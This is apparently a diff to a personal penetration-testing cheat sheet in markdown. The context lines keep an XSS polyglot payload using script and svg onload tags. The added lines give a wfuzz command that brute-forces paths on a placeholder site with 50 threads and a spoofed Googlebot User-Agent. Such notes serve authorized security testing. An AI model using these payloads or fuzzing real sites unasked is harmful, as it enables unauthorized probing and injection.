@@ -22,3 +22,16 @@ Personally created XSS payloads
 ```html
 ;//<!----><SCRIPT>alert(1);</SCRIPT><svg onload="alert(document.domain)">
 ```
+
+<br>
+
+<br>
+
+# wFuzz
+wFuzz is a web application fuzzing tool
+
+##  Ultimate wFuzz command v1 <br>
+
+```sh
+sudo wfuzz --hc 404,400,302,301 -u https://site.com/FUZZ -w WORDLIST.txt -H "User-Agent: Googlebot-News" -t 50
+```
